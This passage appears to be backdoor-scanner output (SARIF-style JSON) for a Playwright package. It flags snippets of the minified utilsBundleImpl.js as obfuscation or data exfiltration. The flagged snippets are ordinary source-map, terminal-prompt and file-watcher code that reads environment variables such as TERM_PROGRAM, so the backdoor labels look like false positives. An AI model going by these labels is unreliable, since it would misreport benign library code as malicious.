                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 31018,
                  "endLine": 16,
                  "endColumn": 31024,
                  "snippet": {
                    "text": "i(r);for(var s=/(?:\\/\\/[@#][\\s]*sourceMappingURL=([^\\s'\"]+)[\\s]*$)|(?:\\/\\*[@#][\\s]*sourceMappingURL=([^\\s*'\"]+)[\\s]*(?:\\*\\/)[\\s]*$)/mg,n,u;u=s.exec(e);)n=u;return n?n[1]:null}var ni=tr(je);je.push(function(r){var e=Oc(r);if(!e)return null;var t;if(Fc.test(e)){var i=e.slice(e.indexOf(\",\")+1);t=vc(i,\"base64\").toString(),e=r}else e=ti(r,e),t=si(e);return t?{url:e,map:t}:null});function ui(r){var e=Ft[r.source];if(!e){var t=ni(r.source);t?(e=Ft[r.source]={url:t.url,map:new bc(t.map)},e.map.sourcesContent&&e.map.sources.forEach(function(s,n){var u=e.map.sourcesContent[n];if(u){var o=ti(e.url,s);Xe[o]=u}}",
                    "rendered": {
                      "text": "i(r);for(var s=/(?:\\/\\/[@#][\\s]*sourceMappingURL=([^\\s'\"]+)[\\s]*$)|(?:\\/\\*[@#][\\s]*sourceMappingURL=([^\\s*'\"]+)[\\s]*(?:\\*\\/)[\\s]*$)/mg,n,u;u=s.exec(e);)n=u;return n?n[1]:null}var ni=tr(je);je.push(function(r){var e=Oc(r);if(!e)return null;var t;if(Fc.test(e)){var i=e.slice(e.indexOf(\",\")+1);t=vc(i,\"base64\").toString(),e=r}else e=ti(r,e),t=si(e);return t?{url:e,map:t}:null});function ui(r){var e=Ft[r.source];if(!e){var t=ni(r.source);t?(e=Ft[r.source]={url:t.url,map:new bc(t.map)},e.map.sourcesContent&&e.map.sources.forEach(function(s,n){var u=e.map.sourcesContent[n];if(u){var o=ti(e.url,s);Xe[o]=u}}",
                      "markdown": "`i(r);for(var s=/(?:\\/\\/[@#][\\s]*sourceMappingURL=([^\\s'\"]+)[\\s]*$)|(?:\\/\\*[@#][\\s]*sourceMappingURL=([^\\s*'\"]+)[\\s]*(?:\\*\\/)[\\s]*$)/mg,n,u;u=s.exec(e);)n=u;return n?n[1]:null}var ni=tr(je);je.push(function(r){var e=Oc(r);if(!e)return null;var t;if(Fc.test(e)){var i=e.slice(e.indexOf(\",\")+1);t=vc(i,\"base64\").toString(),e=r}else e=ti(r,e),t=si(e);return t?{url:e,map:t}:null});function ui(r){var e=Ft[r.source];if(!e){var t=ni(r.source);t?(e=Ft[r.source]={url:t.url,map:new bc(t.map)},e.map.sourcesContent&&e.map.sources.forEach(function(s,n){var u=e.map.sourcesContent[n];if(u){var o=ti(e.url,s);Xe[o]=u}}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1925,
                  "endLine": 16,
                  "endColumn": 1931,
                  "snippet": {
                    "text": "r.encode=function(e){var t=\"\",i,s=ec(e);do i=s&Dn,s>>>=Hr,s>0&&(i|=gn),t+=dn.encode(i);while(s>0);return t};qr.decode=function(e,t,i){var s=e.length,n=0,u=0,o,a;do{if(t>=s)throw new Error(\"Expected more digits in base 64 VLQ value.\");if(a=dn.decode(e.charCodeAt(t++)),a===-1)throw new Error(\"Invalid base64 digit: \"+e.charAt(t-1));o=!!(a&gn),a&=Dn,n=n+(a<<u),u+=Hr}while(o);i.value=tc(n),i.rest=t}});var lt=y(ae=>{function rc(r,e,t){if(e in r)return r[e];if(arguments.length===3)return t;throw new Error('\"'+e+'\" is a required argument.')}ae.getArg=rc;var mn=/^(?:([\\w+\\-.]+):)?\\/\\/(?:(\\w+:\\w+)@)?([\\w.-]*)",
                    "rendered": {
                      "text": "r.encode=function(e){var t=\"\",i,s=ec(e);do i=s&Dn,s>>>=Hr,s>0&&(i|=gn),t+=dn.encode(i);while(s>0);return t};qr.decode=function(e,t,i){var s=e.length,n=0,u=0,o,a;do{if(t>=s)throw new Error(\"Expected more digits in base 64 VLQ value.\");if(a=dn.decode(e.charCodeAt(t++)),a===-1)throw new Error(\"Invalid base64 digit: \"+e.charAt(t-1));o=!!(a&gn),a&=Dn,n=n+(a<<u),u+=Hr}while(o);i.value=tc(n),i.rest=t}});var lt=y(ae=>{function rc(r,e,t){if(e in r)return r[e];if(arguments.length===3)return t;throw new Error('\"'+e+'\" is a required argument.')}ae.getArg=rc;var mn=/^(?:([\\w+\\-.]+):)?\\/\\/(?:(\\w+:\\w+)@)?([\\w.-]*)",
                      "markdown": "`r.encode=function(e){var t=\"\",i,s=ec(e);do i=s&Dn,s>>>=Hr,s>0&&(i|=gn),t+=dn.encode(i);while(s>0);return t};qr.decode=function(e,t,i){var s=e.length,n=0,u=0,o,a;do{if(t>=s)throw new Error(\"Expected more digits in base 64 VLQ value.\");if(a=dn.decode(e.charCodeAt(t++)),a===-1)throw new Error(\"Invalid base64 digit: \"+e.charAt(t-1));o=!!(a&gn),a&=Dn,n=n+(a<<u),u+=Hr}while(o);i.value=tc(n),i.rest=t}});var lt=y(ae=>{function rc(r,e,t){if(e in r)return r[e];if(arguments.length===3)return t;throw new Error('\"'+e+'\" is a required argument.')}ae.getArg=rc;var mn=/^(?:([\\w+\\-.]+):)?\\/\\/(?:(\\w+:\\w+)@)?([\\w.-]*)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 841,
                  "endLine": 46,
                  "endColumn": 852,
                  "snippet": {
                    "text": "${t+1} - `+i:n+i}get selected(){return this.choices}submit(){return this.value=this.choices.map(e=>e.value),super.submit()}};fo.exports=Ui});var go=y((AD,Do)=>{\"use strict\";var Jh=St(),zi=class extends Jh{constructor(e={}){if(super(e),this.emptyError=e.emptyError||\"No items were selected\",this.term=process.env.TERM_PROGRAM,!this.options.header){let t=[\"\",\"4 - Strongly Agree\",\"3 - Agree\",\"2 - Neutral\",\"1 - Disagree\",\"0 - Strongly Disagree\",\"\"];t=t.map(i=>this.styles.muted(i)),this.state.header=t.join(`\n   `)}}async toChoices(...e){if(this.createdScales)return!1;this.createdScales=!0;let t=await super.toCh",
                    "rendered": {
                      "text": "${t+1} - `+i:n+i}get selected(){return this.choices}submit(){return this.value=this.choices.map(e=>e.value),super.submit()}};fo.exports=Ui});var go=y((AD,Do)=>{\"use strict\";var Jh=St(),zi=class extends Jh{constructor(e={}){if(super(e),this.emptyError=e.emptyError||\"No items were selected\",this.term=process.env.TERM_PROGRAM,!this.options.header){let t=[\"\",\"4 - Strongly Agree\",\"3 - Agree\",\"2 - Neutral\",\"1 - Disagree\",\"0 - Strongly Disagree\",\"\"];t=t.map(i=>this.styles.muted(i)),this.state.header=t.join(`\n   `)}}async toChoices(...e){if(this.createdScales)return!1;this.createdScales=!0;let t=await super.toCh",
                      "markdown": "`${t+1} - `+i:n+i}get selected(){return this.choices}submit(){return this.value=this.choices.map(e=>e.value),super.submit()}};fo.exports=Ui});var go=y((AD,Do)=>{\"use strict\";var Jh=St(),zi=class extends Jh{constructor(e={}){if(super(e),this.emptyError=e.emptyError||\"No items were selected\",this.term=process.env.TERM_PROGRAM,!this.options.header){let t=[\"\",\"4 - Strongly Agree\",\"3 - Agree\",\"2 - Neutral\",\"1 - Disagree\",\"0 - Strongly Disagree\",\"\"];t=t.map(i=>this.styles.muted(i)),this.state.header=t.join(`\n   `)}}async toChoices(...e){if(this.createdScales)return!1;this.createdScales=!0;let t=await super.toCh`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 8802,
                  "endLine": 22,
                  "endColumn": 8813,
                  "snippet": {
                    "text": "tends nh{constructor(e={}){super(),this.name=e.name,this.type=e.type,this.options=e,ah(this),uh(this),this.state=new oh(this),this.initial=[e.initial,e.default].find(t=>t!=null),this.stdout=e.stdout||process.stdout,this.stdin=e.stdin||process.stdin,this.scale=e.scale||1,this.term=this.options.term||process.env.TERM_PROGRAM,this.margin=ch(this.options.margin),this.setMaxListeners(0),lh(this)}async keypress(e,t={}){this.keypressed=!0;let i=Ei.action(e,Ei(e,t),this.options.actions);this.state.keypress=i,this.emit(\"keypress\",e,i),this.emit(\"state\",this.state.clone());let s=this.options[i.action]||this[i.acti",
                    "rendered": {
                      "text": "tends nh{constructor(e={}){super(),this.name=e.name,this.type=e.type,this.options=e,ah(this),uh(this),this.state=new oh(this),this.initial=[e.initial,e.default].find(t=>t!=null),this.stdout=e.stdout||process.stdout,this.stdin=e.stdin||process.stdin,this.scale=e.scale||1,this.term=this.options.term||process.env.TERM_PROGRAM,this.margin=ch(this.options.margin),this.setMaxListeners(0),lh(this)}async keypress(e,t={}){this.keypressed=!0;let i=Ei.action(e,Ei(e,t),this.options.actions);this.state.keypress=i,this.emit(\"keypress\",e,i),this.emit(\"state\",this.state.clone());let s=this.options[i.action]||this[i.acti",
                      "markdown": "`tends nh{constructor(e={}){super(),this.name=e.name,this.type=e.type,this.options=e,ah(this),uh(this),this.state=new oh(this),this.initial=[e.initial,e.default].find(t=>t!=null),this.stdout=e.stdout||process.stdout,this.stdin=e.stdin||process.stdin,this.scale=e.scale||1,this.term=this.options.term||process.env.TERM_PROGRAM,this.margin=ch(this.options.margin),this.setMaxListeners(0),lh(this)}async keypress(e,t={}){this.keypressed=!0;let i=Ei.action(e,Ei(e,t),this.options.actions);this.state.keypress=i,this.emit(\"keypress\",e,i),this.emit(\"state\",this.state.clone());let s=this.options[i.action]||this[i.acti`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 6644,
                  "endLine": 22,
                  "endColumn": 6655,
                  "snippet": {
                    "text": "merge({},Ie.symbols,pi,r.symbols);return delete e.merge,e};cu.exports=pi});var du=y((K0,fu)=>{\"use strict\";var th=lu(),rh=hu(),ih=le();fu.exports=r=>{r.options=ih.merge({},r.options.theme,r.options),r.symbols=rh.merge(r.options),r.styles=th.merge(r.options)}});var Eu=y((gu,mu)=>{\"use strict\";var pu=process.env.TERM_PROGRAM===\"Apple_Terminal\",sh=be(),Di=le(),ve=mu.exports=gu,Q=\"\\x1B[\",Du=\"\\x07\",gi=!1,Ge=ve.code={bell:Du,beep:Du,beginning:`${Q}G`,down:`${Q}J`,esc:Q,getPosition:`${Q}6n`,hide:`${Q}?25l`,line:`${Q}2K`,lineEnd:`${Q}K`,lineStart:`${Q}1K`,restorePosition:Q+(pu?\"8\":\"u\"),savePosition:Q+(pu?\"7\":\"s\"",
                    "rendered": {
                      "text": "merge({},Ie.symbols,pi,r.symbols);return delete e.merge,e};cu.exports=pi});var du=y((K0,fu)=>{\"use strict\";var th=lu(),rh=hu(),ih=le();fu.exports=r=>{r.options=ih.merge({},r.options.theme,r.options),r.symbols=rh.merge(r.options),r.styles=th.merge(r.options)}});var Eu=y((gu,mu)=>{\"use strict\";var pu=process.env.TERM_PROGRAM===\"Apple_Terminal\",sh=be(),Di=le(),ve=mu.exports=gu,Q=\"\\x1B[\",Du=\"\\x07\",gi=!1,Ge=ve.code={bell:Du,beep:Du,beginning:`${Q}G`,down:`${Q}J`,esc:Q,getPosition:`${Q}6n`,hide:`${Q}?25l`,line:`${Q}2K`,lineEnd:`${Q}K`,lineStart:`${Q}1K`,restorePosition:Q+(pu?\"8\":\"u\"),savePosition:Q+(pu?\"7\":\"s\"",
                      "markdown": "`merge({},Ie.symbols,pi,r.symbols);return delete e.merge,e};cu.exports=pi});var du=y((K0,fu)=>{\"use strict\";var th=lu(),rh=hu(),ih=le();fu.exports=r=>{r.options=ih.merge({},r.options.theme,r.options),r.symbols=rh.merge(r.options),r.styles=th.merge(r.options)}});var Eu=y((gu,mu)=>{\"use strict\";var pu=process.env.TERM_PROGRAM===\"Apple_Terminal\",sh=be(),Di=le(),ve=mu.exports=gu,Q=\"\\x1B[\",Du=\"\\x07\",gi=!1,Ge=ve.code={bell:Du,beep:Du,beginning:`${Q}G`,down:`${Q}J`,esc:Q,getPosition:`${Q}6n`,hide:`${Q}?25l`,line:`${Q}2K`,lineEnd:`${Q}K`,lineStart:`${Q}1K`,restorePosition:Q+(pu?\"8\":\"u\"),savePosition:Q+(pu?\"7\":\"s\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 3891,
                  "endLine": 19,
                  "endColumn": 3902,
                  "snippet": {
                    "text": "perty(xt.exports,\"other\",{enumerable:!1,value:Yn})});var be=y((H0,ai)=>{\"use strict\";var qc=r=>r!==null&&typeof r==\"object\"&&!Array.isArray(r),jc=/[\\u001b\\u009b][[\\]#;?()]*(?:(?:(?:[^\\W_]*;?[^\\W_]*)\\u0007)|(?:(?:[0-9]{1,4}(;[0-9]{0,4})*)?[~0-9=<>cf-nqrtyA-PRZ]))/g,Gc=()=>typeof process!=\"undefined\"?process.env.FORCE_COLOR!==\"0\":!1,Xn=()=>{let r={enabled:Gc(),visible:!0,styles:{},keys:{}},e=n=>{let u=n.open=`\\x1B[${n.codes[0]}m`,o=n.close=`\\x1B[${n.codes[1]}m`,a=n.regex=new RegExp(`\\\\u001b\\\\[${n.codes[1]}m`,\"g\");return n.wrap=(l,c)=>{l.includes(o)&&(l=l.replace(a,o+u));let h=u+l+o;return c?h.replace(/\\r*\\",
                    "rendered": {
                      "text": "perty(xt.exports,\"other\",{enumerable:!1,value:Yn})});var be=y((H0,ai)=>{\"use strict\";var qc=r=>r!==null&&typeof r==\"object\"&&!Array.isArray(r),jc=/[\\u001b\\u009b][[\\]#;?()]*(?:(?:(?:[^\\W_]*;?[^\\W_]*)\\u0007)|(?:(?:[0-9]{1,4}(;[0-9]{0,4})*)?[~0-9=<>cf-nqrtyA-PRZ]))/g,Gc=()=>typeof process!=\"undefined\"?process.env.FORCE_COLOR!==\"0\":!1,Xn=()=>{let r={enabled:Gc(),visible:!0,styles:{},keys:{}},e=n=>{let u=n.open=`\\x1B[${n.codes[0]}m`,o=n.close=`\\x1B[${n.codes[1]}m`,a=n.regex=new RegExp(`\\\\u001b\\\\[${n.codes[1]}m`,\"g\");return n.wrap=(l,c)=>{l.includes(o)&&(l=l.replace(a,o+u));let h=u+l+o;return c?h.replace(/\\r*\\",
                      "markdown": "`perty(xt.exports,\"other\",{enumerable:!1,value:Yn})});var be=y((H0,ai)=>{\"use strict\";var qc=r=>r!==null&&typeof r==\"object\"&&!Array.isArray(r),jc=/[\\u001b\\u009b][[\\]#;?()]*(?:(?:(?:[^\\W_]*;?[^\\W_]*)\\u0007)|(?:(?:[0-9]{1,4}(;[0-9]{0,4})*)?[~0-9=<>cf-nqrtyA-PRZ]))/g,Gc=()=>typeof process!=\"undefined\"?process.env.FORCE_COLOR!==\"0\":!1,Xn=()=>{let r={enabled:Gc(),visible:!0,styles:{},keys:{}},e=n=>{let u=n.open=`\\x1B[${n.codes[0]}m`,o=n.close=`\\x1B[${n.codes[1]}m`,a=n.regex=new RegExp(`\\\\u001b\\\\[${n.codes[1]}m`,\"g\");return n.wrap=(l,c)=>{l.includes(o)&&(l=l.replace(a,o+u));let h=u+l+o;return c?h.replace(/\\r*\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 2305,
                  "endLine": 19,
                  "endColumn": 2316,
                  "snippet": {
                    "text": "tion o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()=>{t.forEach((c,h)=>h.destroy())})}}});var Qn=y(($0,xt)=>{\"use strict\";var $c=typeof process!=\"undefined\"&&process.env.TERM_PROGRAM===\"Hyper\",Hc=typeof process!=\"undefined\"&&process.platform===\"win32\",Vn=typeof process!=\"undefined\"&&process.platform===\"linux\",oi={ballotDisabled:\"\\u2612\",ballotOff:\"\\u2610\",ballotOn:\"\\u2611\",bullet:\"\\u2022\",bulletWhite:\"\\u25E6\",fullBlock:\"\\u2588\",heart:\"\\u2764\",identicalTo:\"\\u2261\",l",
                    "rendered": {
                      "text": "tion o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()=>{t.forEach((c,h)=>h.destroy())})}}});var Qn=y(($0,xt)=>{\"use strict\";var $c=typeof process!=\"undefined\"&&process.env.TERM_PROGRAM===\"Hyper\",Hc=typeof process!=\"undefined\"&&process.platform===\"win32\",Vn=typeof process!=\"undefined\"&&process.platform===\"linux\",oi={ballotDisabled:\"\\u2612\",ballotOff:\"\\u2610\",ballotOn:\"\\u2611\",bullet:\"\\u2022\",bulletWhite:\"\\u25E6\",fullBlock:\"\\u2588\",heart:\"\\u2764\",identicalTo:\"\\u2261\",l",
                      "markdown": "`tion o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()=>{t.forEach((c,h)=>h.destroy())})}}});var Qn=y(($0,xt)=>{\"use strict\";var $c=typeof process!=\"undefined\"&&process.env.TERM_PROGRAM===\"Hyper\",Hc=typeof process!=\"undefined\"&&process.platform===\"win32\",Vn=typeof process!=\"undefined\"&&process.platform===\"linux\",oi={ballotDisabled:\"\\u2612\",ballotOff:\"\\u2610\",ballotOn:\"\\u2611\",bullet:\"\\u2022\",bulletWhite:\"\\u25E6\",fullBlock:\"\\u2588\",heart:\"\\u2764\",identicalTo:\"\\u2261\",l`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 29822,
                  "endLine": 52,
                  "endColumn": 29827,
                  "snippet": {
                    "text": "&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._closers.get(e);t&&(t.forEach(i=>i()),this._closers.delete(e))}_addPathCloser(e,t){if(!t)return;let i=this._closers.get(e);i||(i=[],this._closers.set(e,i)),i.push(t)}_readdirp(e,t){if(this.closed)return;let i={type:Ns,alwaysStat:!0,lstat:!0,...t},s=Ip(e,i);return this._streams.add(s),s.once(Up,()=>{s=void 0}),s.once(zp,()=>{s&&(this._streams.delete(s),s=void 0)}),s}};Ks.FSWatcher=xr;var h0=(r,e)=>{let t=new xr(e);ret",
                    "rendered": {
                      "text": "&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._closers.get(e);t&&(t.forEach(i=>i()),this._closers.delete(e))}_addPathCloser(e,t){if(!t)return;let i=this._closers.get(e);i||(i=[],this._closers.set(e,i)),i.push(t)}_readdirp(e,t){if(this.closed)return;let i={type:Ns,alwaysStat:!0,lstat:!0,...t},s=Ip(e,i);return this._streams.add(s),s.once(Up,()=>{s=void 0}),s.once(zp,()=>{s&&(this._streams.delete(s),s=void 0)}),s}};Ks.FSWatcher=xr;var h0=(r,e)=>{let t=new xr(e);ret",
                      "markdown": "`&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._closers.get(e);t&&(t.forEach(i=>i()),this._closers.delete(e))}_addPathCloser(e,t){if(!t)return;let i=this._closers.get(e);i||(i=[],this._closers.set(e,i)),i.push(t)}_readdirp(e,t){if(this.closed)return;let i={type:Ns,alwaysStat:!0,lstat:!0,...t},s=Ip(e,i);return this._streams.add(s),s.once(Up,()=>{s=void 0}),s.once(zp,()=>{s&&(this._streams.delete(s),s=void 0)}),s}};Ks.FSWatcher=xr;var h0=(r,e)=>{let t=new xr(e);ret`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 29715,
                  "endLine": 52,
                  "endColumn": 29720,
                  "snippet": {
                    "text": "ncelWait()===Fr)return;this._watched.delete(s),this._watched.delete(n);let h=i?Gp:ml;l&&!this._isIgnored(s)&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._closers.get(e);t&&(t.forEach(i=>i()),this._closers.delete(e))}_addPathCloser(e,t){if(!t)return;let i=this._closers.get(e);i||(i=[],this._closers.set(e,i)),i.push(t)}_readdirp(e,t){if(this.closed)return;let i={type:Ns,alwaysStat:!0,lstat:!0,...t},s=Ip(e,i);return this._streams.add(s),s.once(Up,()=>{s=void 0}),s.",
                    "rendered": {
                      "text": "ncelWait()===Fr)return;this._watched.delete(s),this._watched.delete(n);let h=i?Gp:ml;l&&!this._isIgnored(s)&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._closers.get(e);t&&(t.forEach(i=>i()),this._closers.delete(e))}_addPathCloser(e,t){if(!t)return;let i=this._closers.get(e);i||(i=[],this._closers.set(e,i)),i.push(t)}_readdirp(e,t){if(this.closed)return;let i={type:Ns,alwaysStat:!0,lstat:!0,...t},s=Ip(e,i);return this._streams.add(s),s.once(Up,()=>{s=void 0}),s.",
                      "markdown": "`ncelWait()===Fr)return;this._watched.delete(s),this._watched.delete(n);let h=i?Gp:ml;l&&!this._isIgnored(s)&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._closers.get(e);t&&(t.forEach(i=>i()),this._closers.delete(e))}_addPathCloser(e,t){if(!t)return;let i=this._closers.get(e);i||(i=[],this._closers.set(e,i)),i.push(t)}_readdirp(e,t){if(this.closed)return;let i={type:Ns,alwaysStat:!0,lstat:!0,...t},s=Ip(e,i);return this._streams.add(s),s.once(Up,()=>{s=void 0}),s.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 29405,
                  "endLine": 52,
                  "endColumn": 29410,
                  "snippet": {
                    "text": "ir(s).getChildren().forEach(f=>this._remove(s,f));let a=this._getWatchedDir(e),l=a.has(t);a.remove(t),this._symlinkPaths.has(n)&&this._symlinkPaths.delete(n);let c=s;if(this.options.cwd&&(c=H.relative(this.options.cwd,s)),this.options.awaitWriteFinish&&this._pendingWrites.has(c)&&this._pendingWrites.get(c).cancelWait()===Fr)return;this._watched.delete(s),this._watched.delete(n);let h=i?Gp:ml;l&&!this._isIgnored(s)&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._cl",
                    "rendered": {
                      "text": "ir(s).getChildren().forEach(f=>this._remove(s,f));let a=this._getWatchedDir(e),l=a.has(t);a.remove(t),this._symlinkPaths.has(n)&&this._symlinkPaths.delete(n);let c=s;if(this.options.cwd&&(c=H.relative(this.options.cwd,s)),this.options.awaitWriteFinish&&this._pendingWrites.has(c)&&this._pendingWrites.get(c).cancelWait()===Fr)return;this._watched.delete(s),this._watched.delete(n);let h=i?Gp:ml;l&&!this._isIgnored(s)&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._cl",
                      "markdown": "`ir(s).getChildren().forEach(f=>this._remove(s,f));let a=this._getWatchedDir(e),l=a.has(t);a.remove(t),this._symlinkPaths.has(n)&&this._symlinkPaths.delete(n);let c=s;if(this.options.cwd&&(c=H.relative(this.options.cwd,s)),this.options.awaitWriteFinish&&this._pendingWrites.has(c)&&this._pendingWrites.get(c).cancelWait()===Fr)return;this._watched.delete(s),this._watched.delete(n);let h=i?Gp:ml;l&&!this._isIgnored(s)&&this._emit(h,s),this.options.useFsEvents||this._closePath(s)}_closePath(e){this._closeFile(e);let t=H.dirname(e);this._getWatchedDir(t).remove(H.basename(e))}_closeFile(e){let t=this._cl`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 28701,
                  "endLine": 52,
                  "endColumn": 28706,
                  "snippet": {
                    "text": "et i=t||this.options.disableGlobbing||!Ps(e)?e:kp(e),s=this.options.followSymlinks;return new Us(e,i,s,this)}_getWatchedDir(e){this._boundRemove||(this._boundRemove=this._remove.bind(this));let t=H.resolve(e);return this._watched.has(t)||this._watched.set(t,new Ws(t,this._boundRemove)),this._watched.get(t)}_hasReadPermissions(e){if(this.options.ignorePermissionErrors)return!0;let i=(e&&Number.parseInt(e.mode,10))&511;return!!(4&Number.parseInt(i.toString(8)[0],10))}_remove(e,t,i){let s=H.join(e,t),n=H.resolve(s);if(i=i!=null?i:this._watched.has(s)||this._watched.has(n),!this._throttle(\"remove\",s,10",
                    "rendered": {
